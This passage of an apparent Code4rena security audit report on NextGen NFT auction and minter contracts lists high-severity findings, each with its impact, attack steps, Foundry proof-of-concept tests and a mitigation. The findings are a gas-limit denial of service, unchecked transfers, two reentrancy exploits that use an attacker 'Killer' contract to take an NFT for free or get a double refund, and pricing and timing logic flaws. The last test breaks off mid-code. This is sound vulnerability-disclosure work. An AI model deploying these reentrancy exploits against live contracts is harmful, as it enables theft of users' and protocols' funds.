Right at the start of the auction, a malicious Attacker can call [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61) to place multiple small bids and fill the `auctionInfoData[_tokenid]` array with a high number of entries. Any subsequent calls by genuine users to `participateToAuction()` then reverts due to block gas limit encountered in [unbounded loop](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L69) inside `returnHighestBid()`.
Causes loss of genuine auction bids and hence funds for the protocol since no one is able to place a genuine bid. <br>
Also, [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) will always revert now due to hitting this block gas limit. **So if there is a genuine winner, and there are other genuine bidders whose funds need to be returned, a fund transfer is not possible now**.

## Proof of Concept
1. Right at the start, Attacker calls [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57-L61) multiple times with incrementing values of 1 wei and upward.
2. He continues doing so until the array `auctionInfoData[_tokenid]` size is too large. 
3. Even if there are other genuine bids entered during the above process, the Attacker continues placing higher bids. 
4. Once a high enough array size is attained, he calls [cancelBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124) multiple times to get all his funds back.
5. Now anytime a genuine bidder wants to call `participateToAuction()` which internally calls `returnHighestBid()` [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L58), the block gas limit is hit in [this unbounded loop](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L69).
6. [Same loop is hit due to call to returnHighestBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L107) when `claimAuction()` is called at the end of the auction. Thus funds can not be returned to all the genuine bidders who did not win and also the winner potentially can't be awarded now.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
There are multiple mitigation steps and a combination of these could be taken based on the protocol's discretion:
1. Limit the amount of bids from a single address.
2. Levy a bid cancellation fee.
3. Implement a whitelist/allowList prior to the auction process so that interested parties have to register first. A refundable deposit could also be taken at this point which can be confiscated in case of detected malicious behaviour.

---

### <a id="h-08"></a>[H-08]
## **If transfer of funds fails due to any reason inside `claimAuction()`, they can't be claimed again**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104-L120
<br>

## Impact
[claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) does not check the `success` of low-level `call()` [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113) & [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) but irrespective of it, sets `auctionClaim[_tokenid] = true` [beforehand](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L106). In case `call()` fails, there is no way to retry `claimAuction()` since the [require condition](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L105) will now always revert. <br>
Bidders for whom this failed in the first attempt will not be able to get their bid amount back now. Could also effect the ability of [fund transfer to](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113) `owner()`.

## Proof of Concept
Order of steps:
1. `claimAuction()` is called.
2. `auctionClaim[_tokenid]` is [set to 'true'](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L106).
3. Inside the loop, [fund transfer](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) fails for some index say, `i = 10`. `success` is never checked here, so we continue with the next iteration. We can assume a worse case where multiple indices face this error and funds are not transferred to them.
4. Even though events are emitted which outline this failure, no provision exists for these bidders to claim their funds.
5. `claimAuction()` can not be called again as the [require condition](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L105) will now always revert.

## Tools Used
Manual inspection.

## Recommended Mitigation Steps
Following mitigation steps are possible and a combination of these could be taken based on the protocol's discretion:
1. Separate [payment to owner](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113) and [payment to non-winners](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) into two independent functions.
1. If [fund transfer to](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113) `owner()` fails i.e. `success` is false (implement the check there), then allow the admin to try again later and set the value of `auctionClaim[_tokenid]` as `false`. 
2. If [payment to a non-winner](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) fails i.e. `success` is false (implement the check there too), we can store the failed `auctionInfoData[_tokenid][i].bidder` address in an array so that they can be attempted again later (maybe limit the number of attempts) OR have a public function which when called, lets these addresses claim their refund. This array should also be used to replace the use of `auctionClaim[_tokenid]` in this particular function. Note that we are not `revert`-ing the whole transaction for a particular failed transfer because if transfer to an address at index `i` fails, we still would like to continue performing the remaining transfers from index `i+1` onwards.

---

### <a id="h-09"></a>[H-09]
## **Attacker can exploit reentrancy vulnerability to get ownership of auctioned token for free**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104-L120
<br>

## Impact
Since control is passed to `highestBidder`'s `onERC721Received()` [inside claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L112) and there is no reentrancy guard on various public functions like `claimAuction()`, [cancelBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124) and [cancelAllBids()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L134), an attacker can take part in the auction and get ownership of the token for free.

## Proof of Concept
Attack steps:
1. Attacker places a very high bid via [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57) to emerge as the highest bidder.
2. He calls [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) at end of auction.
3. Protocol [transfers the token to the attacker](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L112) which calls `onERC721Received()` inside the attacker contract.
4. A call to [cancelBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124) or [cancelAllBids()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L134) is made from inside `onERC721Received()`.
5. Attacker's bid amount is returned to him.
6. Ownership of token is transferred to him.
He is the owner of the token for free.
<br>

Steps to run the PoC code:
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cClaimAuction.t.sol`.
- Run via `forge test --mt test_t0x1cClaimAuction -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function approve(address to, uint256 tokenId) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IAuctionDemo {
    function cancelBid(uint256 _tokenid, uint256 index) external;
}

contract Killer is IERC721Receiver {
    IAuctionDemo auctionDemoContract;

    constructor(address _auctionDemo) payable {
        auctionDemoContract = IAuctionDemo(_auctionDemo);
    }

    function onERC721Received(address, address, uint256, bytes memory)
        public
        virtual
        override
        returns (bytes4)
    {
        auctionDemoContract.cancelBid(10000000000, 2); // @audit-issue : reentrancy attack
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

contract t0x1cClaimAuction is Test {
    address public bidder1;
    address public bidder2;
    address public trustedAccount;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;
    auctionDemo hhAuctionDemo;

    Killer contractKiller;

    function setUp() public {
        bidder1 = makeAddr("bidder1");
        bidder2 = makeAddr("bidder2");
        trustedAccount = makeAddr("trustedAccount");
        merkleRoot_msgSender =
            0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1
        _merkleProof_msgSender = new bytes32[](1);
        _merkleProof_msgSender[0] =
            0x9200f00000000000000000000000000000000000000000000000000000000001;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer =
        new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter =
        new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));
        hhAuctionDemo =
            new auctionDemo(address(hhMinter), address(hhCore), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(bidder1, 10 ether);
        vm.deal(bidder2, 90 ether);
        vm.deal(trustedAccount, 100 ether);

        contractKiller = new Killer{value: 100 ether}(address(hhAuctionDemo));
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
        assertNotEq(address(hhAuctionDemo), address(0));
    }

    function test_t0x1cClaimAuction() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, trustedAccount, true);

        /// set collection data
        vm.prank(trustedAccount);
        hhCore.setCollectionData(
            1, // collectionID
            trustedAccount, // collectionArtistAddress
            1, // maxCollectionPurchases
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            1, // timePeriod
            1, // salesOption
            address(0)
        );

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 3 days, // _allowlistEndTime
            block.timestamp + 4 days, // _publicStartTime
            block.timestamp + 5 days, // _publicEndTime
            merkleRoot_msgSender
        );

        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            block.timestamp + 2 days // auction end time
        );
        vm.prank(trustedAccount);
        IERC721(address(hhCore)).approve(address(hhAuctionDemo), 10000000000); // 10000000000 is the tokenId

        assertEq(address(contractKiller).balance, 100 ether);
        vm.warp(block.timestamp + 1 days);

        // simulate some bids by other bidders
        vm.prank(bidder1);
        hhAuctionDemo.participateToAuction{value: 10 ether}(10000000000);
        vm.prank(bidder2);
        hhAuctionDemo.participateToAuction{value: 90 ether}(10000000000);

        // highest bid by attacker
        vm.prank(address(contractKiller));
        hhAuctionDemo.participateToAuction{value: 100 ether}(10000000000);
        assertEq(address(contractKiller).balance, 0);
        assertEq(hhAuctionDemo.returnHighestBid(10000000000), 100 ether);
        assertEq(hhAuctionDemo.returnHighestBidder(10000000000), address(contractKiller));

        skip(1 days); // skip to auction end time
        vm.prank(address(contractKiller));
        hhAuctionDemo.claimAuction(10000000000); // @audit-issue : reentrancy will be exploited here
        assertEq(address(contractKiller).balance, 100 ether); // @audit-info : attacker received his bid amount back!
        assertEq(IERC721(address(hhCore)).ownerOf(10000000000), address(contractKiller)); // @audit-info : attacker owns the NFT for free!!
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Add reentrancy guards on all public/external functions.

---

### <a id="h-10"></a>[H-10]
## **Malicious loser of an auction can make the protocol refund twice the amount he bid via reentrancy attack**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104-L120
<br>

## Impact
Since control is passed to losing bidders' `receive()` [inside claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) and there is no reentrancy guard on various public functions like `claimAuction()` and [cancelBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124), an attacker can take part in the auction and upon losing the auction, get refunded twice the amount he had paid for the bid.

## Proof of Concept
Attack steps:
1. Attacker places a bid via [participateToAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57). His bid is not the winning bid.
2. Either the admin or the winner calls [claimAuction()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104) at end of auction.
3. Protocol [refunds the bid amount to the attacker](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116) which calls `receive()` inside the attacker contract.
4. A call to [cancelBid()](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L124) is made from inside `receive()`. Attacker's bid amount is returned to him in this 'inner call'.
5. Attacker's bid amount is returned to him once again in the 'outer call'.
He just doubled his investment.
<br>

Steps to run the PoC code:
- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cBidLoser.t.sol`.
- Run via `forge test --mt test_t0x1cBidLoser -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

interface IERC721 {
    function approve(address to, uint256 tokenId) external;
}

interface IAuctionDemo {
    function cancelBid(uint256 _tokenid, uint256 index) external;
}

contract Killer {
    IAuctionDemo auctionDemoContract;
    uint256 _counter;

    constructor(address _auctionDemo) payable {
        auctionDemoContract = IAuctionDemo(_auctionDemo);
    }

    receive() external payable {
        _counter++;
        if (_counter == 1) {
            auctionDemoContract.cancelBid(10000000000, 1);
        }
    }
}

contract t0x1cBidLoser is Test {
    address public highestBidder;
    address public aliceBidder;
    address public trustedAccount;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;
    auctionDemo hhAuctionDemo;

    Killer contractKiller;

    function setUp() public {
        highestBidder = makeAddr("highestBidder");
        aliceBidder = makeAddr("aliceBidder");
        trustedAccount = makeAddr("trustedAccount");
        merkleRoot_msgSender =
            0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3; // gives max allowance of 19 tokens in phase1
        _merkleProof_msgSender = new bytes32[](1);
        _merkleProof_msgSender[0] =
            0x9200f00000000000000000000000000000000000000000000000000000000001;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer =
        new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter =
        new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));
        hhAuctionDemo =
            new auctionDemo(address(hhMinter), address(hhCore), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(highestBidder, 30 ether);
        vm.deal(aliceBidder, 5 ether);
        vm.deal(trustedAccount, 100 ether);

        contractKiller = new Killer{value: 6 ether}(address(hhAuctionDemo));
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
        assertNotEq(address(hhAuctionDemo), address(0));
    }

    function test_t0x1cBidLoser() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, trustedAccount, true);

        /// set collection data
        vm.prank(trustedAccount);
        hhCore.setCollectionData(
            1, // collectionID
            trustedAccount, // collectionArtistAddress
            1, // maxCollectionPurchases
            100, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            0, // collectionMintCost
            0, // collectionEndMintCost
            0, // rate
            1, // timePeriod
            1, // salesOption
            address(0)
        );

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp + 3 days, // _allowlistEndTime
            block.timestamp + 4 days, // _publicStartTime
            block.timestamp + 5 days, // _publicEndTime
            merkleRoot_msgSender
        );

        hhMinter.mintAndAuction(
            trustedAccount,
            '{"tdh": "100"}',
            99,
            1,
            block.timestamp + 2 days // auction end time
        );
        vm.prank(trustedAccount);
        IERC721(address(hhCore)).approve(address(hhAuctionDemo), 10000000000);

        assertEq(address(contractKiller).balance, 6 ether);
        vm.warp(block.timestamp + 1 days);

        // place bids
        vm.prank(aliceBidder);
        hhAuctionDemo.participateToAuction{value: 5 ether}(10000000000);
        // a losing bid by attacker
        vm.prank(address(contractKiller));
        hhAuctionDemo.participateToAuction{value: 6 ether}(10000000000);
        assertEq(address(contractKiller).balance, 0);

        vm.prank(highestBidder);
        hhAuctionDemo.participateToAuction{value: 30 ether}(10000000000);
        assertEq(hhAuctionDemo.returnHighestBid(10000000000), 30 ether);
        assertEq(hhAuctionDemo.returnHighestBidder(10000000000), highestBidder);

        skip(1 days); // auction end time
        // either the `highestBidder` or the admin calls `claimAuction()`
        // Note that `highestBidder` could well be just another account of `contractKiller` used to call claimAuction()
        hhAuctionDemo.claimAuction(10000000000); // @audit-info : reentrancy attack vector

        assertEq(address(contractKiller).balance, 12 ether); // @audit-info : attacker refunded twice the bid amount!
    }
}
```

## Tools Used
Foundry.

## Recommended Mitigation Steps
Add reentrancy guards on all the existing public/external functions.

---

### <a id="h-11"></a>[H-11]
## **Incorrect `Linear Descending Sale Price` calculation by `getPrice()` causes loss of funds for the protocol**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553
<br>

## Impact
For **Linear Descending Sale Price** calculation inside `getPrice()`, rounding-down happens [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553) while dividing with `collectionPhases[_collectionId].rate` and as such, when it is compared to tDiff via `> tDiff`, it causes the function to return a reduced value than expected. Instead, `>= tDiff` should have been used.
The minter can hence pay less `msg.value` than he should have and causes loss of funds for the protocol.

## Proof of Concept
The following PoC shows how `getPrice()` returns a value of `3 ether` instead of the correct expected value of `4 ether` after advancing by 4 timePeriods.

- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cGetPriceTDiff.t.sol`.
- Run via `forge test --mt test_t0x1cGetPriceTDiff -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

contract t0x1cGetPriceTDiff is Test {
    address public addr1;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        addr1 = makeAddr("addr1");
        merkleRoot_msgSender =
            0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer =
        new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter =
        new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cGetPriceTDiff() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            2, // maxCollectionPurchases
            2, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            12 ether, // collectionMintCost
            3 ether, // collectionEndMintCost
            2 ether, // rate
            1 days, // timePeriod
            2, // salesOption
            address(0)
        );

        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp + 1 days, // _allowlistStartTime
            block.timestamp + 2 days, // _allowlistEndTime
            block.timestamp + 3 days, // _publicStartTime
            block.timestamp + 13 days, // _publicEndTime
            merkleRoot_msgSender
        );

        // jump
        vm.warp(block.timestamp + 1 days);
        console.log("0 timePeriod decrease ->", hhMinter.getPrice(1));

        skip(1 days);
        console.log("1 timePeriod decrease ->", hhMinter.getPrice(1));

        skip(1 days);
        console.log("2 timePeriod decrease ->", hhMinter.getPrice(1));

        skip(1 days);
        console.log("3 timePeriod decrease ->", hhMinter.getPrice(1));

        // @audit-issue : calculated price is 3 ether instead of the expected 4 ether
        skip(1 days);
        uint256 calculatedPrice = hhMinter.getPrice(1);
        console.log("4 timePeriod decrease ->", calculatedPrice);

        skip(1 days);
        console.log("5 timePeriod decrease ->", hhMinter.getPrice(1));

        assertEq(calculatedPrice, 4 ether); // fails
    }
}
```

Output:
```text
Logs:
  0 timePeriod decrease -> 12000000000000000000
  1 timePeriod decrease -> 10000000000000000000
  2 timePeriod decrease -> 8000000000000000000
  3 timePeriod decrease -> 6000000000000000000
  4 timePeriod decrease -> 3000000000000000000      <------- Incorrect 
  5 timePeriod decrease -> 3000000000000000000
  Error: a == b not satisfied [uint]
        Left: 3000000000000000000
       Right: 4000000000000000000
```

## Tools Used
Manual inspection, Foundry.

## Recommended Mitigation Steps
Make the following change:

```diff
File: smart-contracts/MinterContract.sol#L553

-   if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) {
+   if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) >= tDiff) {
```

---

### <a id="h-12"></a>[H-12]
## **`Periodic Sales` Model's `timePeriod` constraint is not implemented correctly**
#### https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L543
<br>

## Impact
Docs [say](https://seize-io.gitbook.io/nextgen/for-creators/sales-models#sales-models-examples):
> At this example the minting price increases by 10% based on the NFTs minted. In addition during each time period of 600s just 1 NFT can be minted.
> Let's assume that the minting sale starts at 24/07/2023 14:00. The first minting takes place at 24/07/2023 14:03. Users will be able to mint again after the time period has elapsed so after 24/07/2023 14:13. In case they try to mint prior that time their transaction will be reverted.

The above criteria is not followed by the protocol due to incorrect logic [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L543) and hence the user is able to mint another token at `14:10` itself. 
Other unsuspecting users unaware of the logic flaw will always lose out on the opportunity of minting the token.
<br>

**Note:** Similar logic is present inside `mintAndAuction()` [here](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L295).

## Proof of Concept
The following PoC shows how a user is able to mint within `6 seconds` of the previous mint, in spite of the `timePeriod` constraint being `1 day`.

- Install foundry and run `forge init --no-git --force` from root folder (`2023-10-nextgen/`).
- Paste the following code inside a new file `2023-10-nextgen/test/t0x1cSalesOption3TimePeriod.t.sol`.
- Run via `forge test --mt test_t0x1cSalesOption3TimePeriod -vv`

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol";
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

contract t0x1cSalesOption3TimePeriod is Test {
    address public addr1;
    address public anyone;
    bytes32 public merkleRoot_msgSender;
    bytes32[] public _merkleProof_msgSender;
    string[] public _collectionScript;

    DelegationManagementContract hhDelegation;
    randomPool hhRandoms;
    NextGenAdmins hhAdmin;
    NextGenCore hhCore;
    NextGenRandomizerNXT hhRandomizer;
    NextGenMinterContract hhMinter;

    function setUp() public {
        addr1 = makeAddr("addr1");
        anyone = makeAddr("anyone");
        merkleRoot_msgSender = 0x208fae20dc5074374a223a1a825bfc23fbf2c9c88f5b092fa3421d54058170d3;

        hhDelegation = new DelegationManagementContract();
        hhRandoms = new randomPool();
        hhAdmin = new NextGenAdmins();
        hhCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(hhAdmin));

        // This example uses the NXT Randomizer
        hhRandomizer = new NextGenRandomizerNXT(address(hhRandoms), address(hhAdmin), address(hhCore));

        hhMinter = new NextGenMinterContract(address(hhCore), address(hhDelegation), address(hhAdmin));

        checkIfContractsAreDeployed();

        _collectionScript = new string[](1);
        _collectionScript[0] = "desc";

        vm.deal(anyone, 100 ether);
    }

    function checkIfContractsAreDeployed() public {
        assertNotEq(address(hhAdmin), address(0));
        assertNotEq(address(hhCore), address(0));
        assertNotEq(address(hhDelegation), address(0));
        assertNotEq(address(hhMinter), address(0));
        assertNotEq(address(hhRandomizer), address(0));
        assertNotEq(address(hhRandoms), address(0));
    }

    function test_t0x1cSalesOption3TimePeriod() public {
        /// create collection
        hhCore.createCollection(
            "Test Collection 1",
            "Artist 1",
            "For testing",
            "www.test.com",
            "CCO",
            "https://ipfs.io/ipfs/hash/",
            "",
            _collectionScript
        );

        /// register collection admin
        hhAdmin.registerCollectionAdmin(1, addr1, true);

        /// set collection data
        vm.prank(addr1);
        hhCore.setCollectionData(
            1, // collectionID
            addr1, // collectionArtistAddress
            3, // maxCollectionPurchases
            3, // collectionTotalSupply
            1_000 // setFinalSupplyTimeAfterMint
        );

        /// set minter contract
        hhCore.addMinterContract(address(hhMinter));

        /// set randomizer contracts
        hhCore.addRandomizer(1, address(hhRandomizer));

        hhMinter.setCollectionCosts(
            1, // collectionID
            1 ether, // collectionMintCost
            0, // collectionEndMintCost
            10, // rate
            1 days, // timePeriod
            3, // salesOption
            address(0)
        );

        vm.warp(block.timestamp + 1 days);
        hhMinter.setCollectionPhases(
            1, // collectionID
            block.timestamp, // _allowlistStartTime
            block.timestamp, // _allowlistEndTime
            block.timestamp + 1 days, // _publicStartTime
